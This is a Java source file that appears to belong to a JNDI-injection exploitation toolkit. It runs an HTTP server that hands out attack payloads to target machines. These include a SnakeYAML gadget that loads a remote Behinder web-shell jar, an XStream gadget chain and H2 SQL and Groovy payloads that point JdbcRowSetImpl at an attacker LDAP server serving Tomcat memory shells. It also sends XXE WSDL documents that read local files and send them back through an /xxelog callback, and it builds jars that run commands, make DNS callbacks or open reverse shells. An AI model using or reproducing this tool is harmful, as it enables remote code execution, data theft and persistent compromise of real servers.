package com.feihong.ldap;

import cn.hutool.core.io.file.FileReader;
import com.feihong.ldap.template.CommandTemplate;
import com.feihong.ldap.template.DnslogTemplate;
import com.feihong.ldap.template.ReverseShellTemplate;
import com.feihong.ldap.utils.Cache;
import com.feihong.ldap.utils.Config;
import com.feihong.ldap.utils.Util;
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.lang3.reflect.FieldUtils;

import java.io.*;
import java.net.InetSocketAddress;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarOutputStream;
import java.util.zip.ZipEntry;

public class HTTPServer {
    public static String cwd = System.getProperty("user.dir");

    public static void start() throws IOException {

        HttpServer httpServer = HttpServer.create(new InetSocketAddress(Config.httpPort), 0);
        httpServer.createContext("/", new HttpHandler() {
            @Override
            public void handle(HttpExchange httpExchange){
                try {
                    System.out.println("[+] New HTTP Request From " + httpExchange.getRemoteAddress() + "  " + httpExchange.getRequestURI());

                    String path = httpExchange.getRequestURI().getPath();
                    if(path.endsWith(".class")){
                        handleClassRequest(httpExchange);
                    }else if(path.endsWith(".wsdl")){
                        handleWSDLRequest(httpExchange);
                    }else if(path.endsWith(".jar")){
                        handleJarRequest(httpExchange);
                    }else if(path.startsWith("/xxelog")){
                        handleXXELogRequest(httpExchange);
                    }else if(path.endsWith(".sql")){
                        handleSQLRequest(httpExchange);
                    }else if (path.endsWith(".groovy")){
                        handlerGroovyRequest(httpExchange);
                    }else if(path.endsWith(".xml")) {
                        handleXMLRequest(httpExchange);
                    }else if(path.endsWith(".txt")) {
                        handleTXTRequest(httpExchange);
                    }else if(path.endsWith(".yml")){
                        handleYmlRequest(httpExchange);
                    }else{
                        handleFileRequest(httpExchange);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });

        httpServer.setExecutor(null);
        httpServer.start();
        System.out.println("\033[0;92m"+"[+] " + "\33[0m" + "\033[0;94m" + "HTTP Server Start Listening on: " + "\33[0m" + Config.httpPort + "...");
    }

    private static void handleFileRequest(HttpExchange exchange) throws Exception {
        String path = exchange.getRequestURI().getPath();
        String filename =  cwd + File.separator + "data" + File.separator +path.substring(path.lastIndexOf("/") + 1);
        File file = new File(filename);
        if (file.exists()){
            byte[] bytes = new byte[(int) file.length()];
            FileInputStream fileInputStream = new FileInputStream(file);
            fileInputStream.read(bytes);
            exchange.sendResponseHeaders(200, file.length() + 1);
            exchange.getResponseBody().write(bytes);
        }else {
            System.out.println("[!] Response Code: " + 404);
            exchange.sendResponseHeaders(404, 0);
        }
        exchange.close();

    }

    private static void handleYmlRequest(HttpExchange exchange) throws IOException {
        String path = exchange.getRequestURI().getPath();
//        String host = exchange.getRequestURI().getHost();
        String YamlName =  path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
        String bytes = "!!javax.script.ScriptEngineManager [\n" +
                "  !!java.net.URLClassLoader [[\n" +
                "    !!java.net.URL [\"http://"+ Config.ip +":"+ Config.httpPort + "/behinder3.jar\"]\n" +
                "  ]]\n" +
                "]\n";
        String yaml = "!!com.sun.rowset.JdbcRowSetImpl\n" +
                "  dataSourceName: \"ldap://127.0.0.1:1389/basic/TomcatMemShell3\"\n" +
                "  autoCommit: true";

        if (YamlName.equalsIgnoreCase("snake")) {
            System.out.println("[+] Response Code: " + 200);
//            exchange.getResponseHeaders().set("Content-type","application/octet-stream");
            exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
//            exchange.sendResponseHeaders(200, yaml.getBytes().length + 1);
            exchange.getResponseBody().write(bytes.getBytes("UTF-8"));
//            exchange.getResponseBody().write(yaml.getBytes("UTF-8"));
        }else {
            String pa = cwd + File.separator + "data";
            File file = new File(pa + File.separator + YamlName + ".yml");
            if (file.exists()){
                byte[] bytes1 = new byte[(int) file.length()];
                try (FileInputStream fileInputStream = new FileInputStream(file)) {
                    fileInputStream.read(bytes1);
                }
                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
                exchange.sendResponseHeaders(200, file.length() + 1);
                exchange.getResponseBody().write(bytes1);
            } else {
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }

        }
        exchange.close();
    }

    public static void handleTXTRequest(HttpExchange exchange) throws IOException {
        String path = exchange.getRequestURI().getPath();
        String txtname =  path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
        if (txtname.equalsIgnoreCase("isok")){
            System.out.println("[+] Response Code: " + 200);
            byte[] bytes = "success!".getBytes();
            exchange.getResponseHeaders().set("Content-type","application/octet-stream");
            exchange.sendResponseHeaders(200, bytes.length + 1);
            exchange.getResponseBody().write(bytes);
        }else {
            String pa = cwd + File.separator + "data";
            File file = new File(pa + File.separator + txtname + ".txt");

            if (file.exists()){

                byte[] bytes1 = new byte[(int) file.length()];
                try (FileInputStream fileInputStream = new FileInputStream(file)) {
                    fileInputStream.read(bytes1);
                }
                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
                exchange.sendResponseHeaders(200, file.length() + 1);
                exchange.getResponseBody().write(bytes1);
            }else {
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }
        }
        exchange.close();
    }

    public static void handleXMLRequest(HttpExchange exchange) throws IOException {
        String path = exchange.getRequestURI().getPath();
//        String host = exchange.getRequestURI().getHost();
        String xmlName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
        String bytes = "<configuration>\n  <insertFromJNDI env-entry-name=\"ldap://" + Config.ip + ":"+ Config.ldapPort + "/TomcatBypass/TomcatMemshell3\" as=\"appName\" />\n</configuration>";
        String xstream = "<linked-hash-set>\n" +
                "    <jdk.nashorn.internal.objects.NativeString>\n" +
                "      <flags>0</flags>\n" +
                "      <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n" +
                "        <dataHandler>\n" +
                "          <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n" +
                "            <is class=\"javax.crypto.CipherInputStream\">\n" +
                "              <cipher class=\"javax.crypto.NullCipher\">\n" +
                "                <initialized>false</initialized>\n" +
                "                <opmode>0</opmode>\n" +
                "                <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n" +
                "                  <iter class=\"javax.imageio.spi.FilterIterator\">\n" +
                "                    <iter class=\"java.util.Collections$EmptyIterator\"/>\n" +
                "                    <next class=\"com.sun.rowset.JdbcRowSetImpl\" serialization=\"custom\">\n" +
                "                      <javax.sql.rowset.BaseRowSet>\n" +
                "                        <default>\n" +
                "                          <concurrency>1008</concurrency>\n" +
                "                          <escapeProcessing>true</escapeProcessing>\n" +
                "                          <fetchDir>1000</fetchDir>\n" +
                "                          <fetchSize>0</fetchSize>\n" +
                "                          <isolation>2</isolation>\n" +
                "                          <maxFieldSize>0</maxFieldSize>\n" +
                "                          <maxRows>0</maxRows>\n" +
                "                          <queryTimeout>0</queryTimeout>\n" +
                "                          <readOnly>true</readOnly>\n" +
                "                          <rowSetType>1004</rowSetType>\n" +
                "                          <showDeleted>false</showDeleted>\n" +
                "                          <dataSource>ldap://" + Config.ip + ":1389/basic/TomcatMemShell3</dataSource>\n" +
                "                          <listeners/>\n" +
                "                          <params/>\n" +
                "                        </default>\n" +
                "                      </javax.sql.rowset.BaseRowSet>\n" +
                "                      <com.sun.rowset.JdbcRowSetImpl>\n" +
                "                        <default>\n" +
                "                          <iMatchColumns>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                            <int>-1</int>\n" +
                "                          </iMatchColumns>\n" +
                "                          <strMatchColumns>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                            <null/>\n" +
                "                          </strMatchColumns>\n" +
                "                        </default>\n" +
                "                      </com.sun.rowset.JdbcRowSetImpl>\n" +
                "                    </next>\n" +
                "                  </iter>\n" +
                "                  <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\n" +
                "                    <method>\n" +
                "                      <class>com.sun.rowset.JdbcRowSetImpl</class>\n" +
                "                      <name>getDatabaseMetaData</name>\n" +
                "                      <parameter-types/>\n" +
                "                    </method>\n" +
                "                    <name>foo</name>\n" +
                "                  </filter>\n" +
                "                  <next class=\"string\">foo</next>\n" +
                "                </serviceIterator>\n" +
                "                <lock/>\n" +
                "              </cipher>\n" +
                "              <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n" +
                "              <ibuffer></ibuffer>\n" +
                "              <done>false</done>\n" +
                "              <ostart>0</ostart>\n" +
                "              <ofinish>0</ofinish>\n" +
                "              <closed>false</closed>\n" +
                "            </is>\n" +
                "            <consumed>false</consumed>\n" +
                "          </dataSource>\n" +
                "          <transferFlavors/>\n" +
                "        </dataHandler>\n" +
                "        <dataLen>0</dataLen>\n" +
                "      </value>\n" +
                "    </jdk.nashorn.internal.objects.NativeString>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "  <entry>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "    <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n" +
                "  </entry>\n" +
                "</linked-hash-set>";

        if(xmlName.equals("a")) {
            System.out.println("[+] Response Code: " + 200);


            exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
            exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
        }else if (xmlName.equals("x")){
            System.out.println("[+] Response Code: " + 200);
            exchange.getResponseHeaders().add("Content-Type","application/xml; charset=utf-8");
            exchange.sendResponseHeaders(200, xstream.getBytes().length + 1);
            exchange.getResponseBody().write(xstream.getBytes(StandardCharsets.UTF_8));

        }else {
            String pa = cwd + File.separator + "data";
            File file = new File(pa + File.separator + xmlName + ".xml");

            if (file.exists()){
                byte[] bytes1 = new byte[(int) file.length()];
                try (FileInputStream fileInputStream = new FileInputStream(file)) {
                    fileInputStream.read(bytes1);
                }
                exchange.getResponseHeaders().add("Content-Type","application/xml; charset=utf-8");
//                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
                exchange.sendResponseHeaders(200, file.length() + 1);
                exchange.getResponseBody().write(bytes1);
            }else {
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }

        }
        exchange.close();

    }

    public static void handleSQLRequest(HttpExchange exchange) throws IOException {
        String path = exchange.getRequestURI().getPath();
        String host = exchange.getRequestURI().getHost();
        String sqlName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));

        if(sqlName.equalsIgnoreCase("echo")){
            System.out.println("[+] Response Code: " + 200);

            String name = String.valueOf(System.nanoTime());
            String bytes = "CREATE ALIAS " + name + " AS CONCAT('void ex()throws Exception" +
                    "{Object o = com.sun.rowset.JdbcRowSetImpl();',' o.setDataSourceName(\"ldap://" + host + ":1389/TomcatBypass/TomcatEcho\");',' 'o.setAutoCommit(\"true\");,'}');" +
                    "CALL " + name + "();\"}";
            exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
            exchange.getResponseBody().write(bytes.getBytes("UTF-8"));
        }else if(sqlName.equalsIgnoreCase("inject")){
            System.out.println("[+] Response Code: " + 200);

            String name = String.valueOf(System.nanoTime());
            String bytes = "CREATE ALIAS " + name + " AS CONCAT('void ex()throws Exception" +
                    "{Object o = com.sun.rowset.JdbcRowSetImpl();',' o.setDataSourceName(\"ldap:// + host + :1389/inject.class\");',' 'o.setAutoCommit(\"true\");,'}');" +
                    "CALL " + name + "();\"}";
            exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
            exchange.getResponseBody().write(bytes.getBytes("UTF-8"));

        }else{

            String pa = cwd + File.separator + "data";
            File file = new File(pa + File.separator + sqlName + ".sql");

            if (file.exists()){
                byte[] bytes = new byte[(int) file.length()];
                try (FileInputStream fileInputStream = new FileInputStream(file)) {
                    fileInputStream.read(bytes);
                }
//                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
                exchange.sendResponseHeaders(200, file.length() + 1);
                exchange.getResponseBody().write(bytes);
            } else {
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }
        }
        exchange.close();
    }

    public static void handlerGroovyRequest(HttpExchange exchange) throws IOException {
        String path = exchange.getRequestURI().getPath();
        String host = exchange.getRequestURI().getHost();
        String exp = "/TomcatBypass/TomcatEcho";
        String groovyName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));

        if(groovyName.equalsIgnoreCase("groovyecho")){
            System.out.println("[+] Response Code: " + 200);

            String bytes = "class demo {\n" +
                    "    static void main(){\n" +
                    "        com.sun.rowset.JdbcRowSetImpl o = new com.sun.rowset.JdbcRowSetImpl();\n" +
                    "        o.setDataSourceName(\"ldap://" + host + ":1389" + exp + "\");\n" +
                    "        o.setAutoCommit(true);\n" +
                    "    }\n" +
                    "}\n";

            exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
            exchange.getResponseBody().write(bytes.getBytes("UTF-8"));

        }else{
            String pa = cwd + File.separator + "data";
            File file = new File(pa + File.separator + groovyName + ".groovy");

            if (file.exists()){
                byte[] bytes = new byte[(int) file.length()];
                try (FileInputStream fileInputStream = new FileInputStream(file)) {
                    fileInputStream.read(bytes);
                }
//                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
                exchange.sendResponseHeaders(200, file.length() + 1);
                exchange.getResponseBody().write(bytes);
            } else {
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }

        }
        exchange.close();

    }

    public static void handleXXELogRequest(HttpExchange exchange) throws IllegalAccessException, IOException {
        Object exchangeImpl = FieldUtils.readField(exchange, "impl", true);
        Object request = FieldUtils.readField(exchangeImpl, "req", true);
        String startLine = (String) FieldUtils.readField(request, "startLine", true);

        System.out.println("[+] XXE Attack Result: " + startLine);
        exchange.sendResponseHeaders(200, 0);
        exchange.close();
    }

    private static void handleJarRequest(HttpExchange exchange) throws IOException{
        String path = exchange.getRequestURI().getPath();
        String jarName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));

        if (jarName.equalsIgnoreCase("behinder3")){
            byte[] bytes =  null;
            String filename =  cwd + File.separator +"data" + File.separator + "behinder3.jar";
            FileReader fileReader = new FileReader(filename,"UTF-8");
            bytes = fileReader.readBytes();
            exchange.sendResponseHeaders(200, bytes.length + 1);
            exchange.getResponseBody().write(bytes);
        }else {

            String filename =  cwd + File.separator +"data" + File.separator + jarName + ".jar";
            File file = new File(filename);
            if (file.exists()){
                byte[] bytes =  null;
                FileReader fileReader = new FileReader(filename,"UTF-8");
                bytes = fileReader.readBytes();
                exchange.sendResponseHeaders(200, bytes.length + 1);
                exchange.getResponseBody().write(bytes);
            }else {
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }

        }
        exchange.close();



    }

    private static void handleClassRequest(HttpExchange exchange) throws IOException{
        String path = exchange.getRequestURI().getPath();
        String className = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
        System.out.println("[+] Receive ClassRequest: " + className + ".class");

        //先从Cache中加载
        if(Cache.contains(className)){
            System.out.println("[+] Response Code: " + 200);

            byte[] bytes = Cache.get(className);
            exchange.sendResponseHeaders(200, bytes.length);
            //这一步返回http请求
            exchange.getResponseBody().write(bytes);
        }else{//找不到就从/data目录下照
            String pa = cwd + File.separator + "data";
            File file = new File(pa + File.separator + className + ".class");

            if (file.exists()){
                byte[] bytes = new byte[(int) file.length()];
                try (FileInputStream fileInputStream = new FileInputStream(file)) {
                    fileInputStream.read(bytes);
                }
                exchange.getResponseHeaders().set("Content-type","application/octet-stream");
                exchange.sendResponseHeaders(200, file.length() + 1);
                exchange.getResponseBody().write(bytes);
            }else {
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }

        }
        exchange.close();
    }

    private static void handleWSDLRequest(HttpExchange exchange) throws Exception {
        String query = exchange.getRequestURI().getQuery();
        Map<String, String> params = parseQuery(query);

        String path = exchange.getRequestURI().getPath().substring(1);

        if(path.startsWith("list")) {
            //intended to list directories or read files on server
            String file = params.get("file");
            if (file != null && !file.isEmpty()) {
                String listWsdl = "" +
                        "<!DOCTYPE x [\n" +
                        "  <!ENTITY % aaa SYSTEM \"file:///" + file + "\">\n" +
                        "  <!ENTITY % bbb SYSTEM \"http://" + Config.ip + ":" + Config.httpPort + "/http.wsdl\">\n" +
                        "  %bbb;\n" +
                        "]>\n" +
                        "<definitions name=\"HelloService\" xmlns=\"http://schemas.xmlsoap.org/wsdl/\">\n" +
                        "  &ddd;\n" +
                        "</definitions>";

                System.out.println("[+] Response Code: " + 200);
                exchange.sendResponseHeaders(200, listWsdl.getBytes().length);
                exchange.getResponseBody().write(listWsdl.getBytes());
            } else {
                System.out.println("[!] Missing or wrong argument");
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }
            exchange.close();

        }else if(path.startsWith("upload")) {
            String type = params.get("type");

            String[] args = null;
            if (type.equalsIgnoreCase("command")) {
                args = new String[]{params.get("cmd")};
            } else if (type.equalsIgnoreCase("dnslog")) {
                args = new String[]{params.get("url")};
            } else if (type.equalsIgnoreCase("reverseshell")) {
                args = new String[]{params.get("ip"), params.get("port")};
            }

            String jarName = createJar(type, args);
            if (jarName != null) {
                String uploadWsdl = "<!DOCTYPE a SYSTEM \"jar:http://" + Config.ip + ":" + Config.httpPort +
                        "/" + jarName + ".jar!/file.txt\"><a></a>";

                System.out.println("[+] Response Code: " + 200);
                exchange.sendResponseHeaders(200, uploadWsdl.getBytes().length);
                exchange.getResponseBody().write(uploadWsdl.getBytes());
            } else {
                System.out.println("[!] Missing or wrong argument");
                System.out.println("[!] Response Code: " + 404);
                exchange.sendResponseHeaders(404, 0);
            }
            exchange.close();
        }else if(path.startsWith("http"))  {
            String xxhttp = "<!ENTITY % ccc '<!ENTITY ddd &#39;<import namespace=\"uri\" location=\"http://" +
                    Config.ip + ":" + Config.httpPort + "/xxelog?%aaa;\"/>&#39;>'>%ccc;";
            System.out.println("[+] Response Code: " + 200);
            exchange.sendResponseHeaders(200, xxhttp.getBytes().length);
            exchange.getResponseBody().write(xxhttp.getBytes());
            exchange.close();
        }else{
            System.out.println("[!] Response Code: " + 404);
            exchange.sendResponseHeaders(404, 0);
            exchange.close();
        }
    }

    private static Map<String, String> parseQuery(String query){
        Map<String,String> params = new HashMap<String, String>();

        try{
            for(String str : query.split("&")){
                try{
                    String[] parts = str.split("=",2);
                    params.put(parts[0], parts[1]);
                }catch(Exception e){
                    //continue
                }
            }
        }catch(Exception e){
            //continue
        }

        return params;
    }

    /*
         由于我本地安装的 Websphere 在加载本地 classpath 这一步复现不成功
         这里不确定 websphere 这种方式在多次操作时 Class 文件名相同时是否会存在问题
         目前暂时认为其不会有问题，如果有问题，后面再修改
    */
    private static String createJar(String type, String... params) throws Exception {
        byte[] bytes = new byte[0];
        String className = "xExportObject";

        if (type.toLowerCase().equals("command")) {
            CommandTemplate commandTemplate = new CommandTemplate(params[0], "xExportObject");
            bytes = commandTemplate.getBytes();
        } else if (type.toLowerCase().equals("dnslog")){
            DnslogTemplate dnslogTemplate = new DnslogTemplate(params[0], "xExportObject");
            bytes = dnslogTemplate.getBytes();
        } else if (type.toLowerCase().equals("reverseshell")) {
            ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(params[0], params[1], "xExportObject");
            bytes = reverseShellTemplate.getBytes();
        } else if (type.toLowerCase().equals("webspherememshell")) {
            ClassPool classPool = ClassPool.getDefault();
            CtClass exploitClass = classPool.get("com.feihong.ldap.template.WebsphereMemshellTemplate");
            exploitClass.setName(className);
            exploitClass.detach();
            bytes = exploitClass.toBytecode();
        }else{
            return null;
        }

        System.out.println("[+] Name of Class in Jar: " + className);
        ByteArrayOutputStream bout = new ByteArrayOutputStream();
        JarOutputStream jarOut = new JarOutputStream(bout);
        jarOut.putNextEntry(new ZipEntry(className + ".class"));
        jarOut.write(bytes);
        jarOut.closeEntry();
        jarOut.close();
        bout.close();

        String jarName = Util.getRandomString();
        Cache.set(jarName, bout.toByteArray());

        return jarName;
    }
}
